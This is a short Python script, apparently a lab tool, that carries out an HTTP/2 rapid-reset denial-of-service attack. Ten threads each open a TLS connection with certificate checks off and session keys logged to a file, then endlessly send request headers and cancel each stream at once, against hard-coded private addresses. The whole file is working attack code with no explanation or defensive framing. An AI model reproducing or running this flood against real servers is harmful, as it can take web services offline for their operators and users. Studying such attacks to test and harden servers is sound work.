import threading
import socket
from h2.connection import H2Connection
from h2.events import RequestReceived, StreamReset
from h2.config import H2Configuration
import ssl
from h2.errors import ErrorCodes


def root_function(url='192.168.59.211', port=443, f="/mnt/d/keys"):
    sock = socket.create_connection((url, port))
    i = 0
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.keylog_filename = f
    ctx.set_alpn_protocols(['h2'])
    sock = ctx.wrap_socket(sock, server_hostname=url)
    config = H2Configuration(client_side=True)
    conn = H2Connection(config=config)
    conn.initiate_connection()
    sock.sendall(conn.data_to_send())
    while True:
        try:

            assert sock.selected_alpn_protocol() == 'h2'

            stream_id = conn.get_next_available_stream_id()

            print(stream_id)
            conn.send_headers(
                stream_id,
                [(':method', 'GET'), (':authority', url), (':path', '/'),
                 (':scheme', 'https')],
            )
            sock.sendall(conn.data_to_send())

            conn.reset_stream(stream_id, error_code=ErrorCodes.CANCEL)

            sock.sendall(conn.data_to_send())
            i += 1
            if i == 30:
                pass
        except Exception as e:
            print(f"An error occurred: {e}")


threads = []
for i in range(10):
    thread = threading.Thread(target=root_function, args=(
        '192.168.32.128', 8443, "d:\\keys"))
    thread.start()
    threads.append(thread)

# Keep the main thread alive
for thread in threads:
    thread.join()
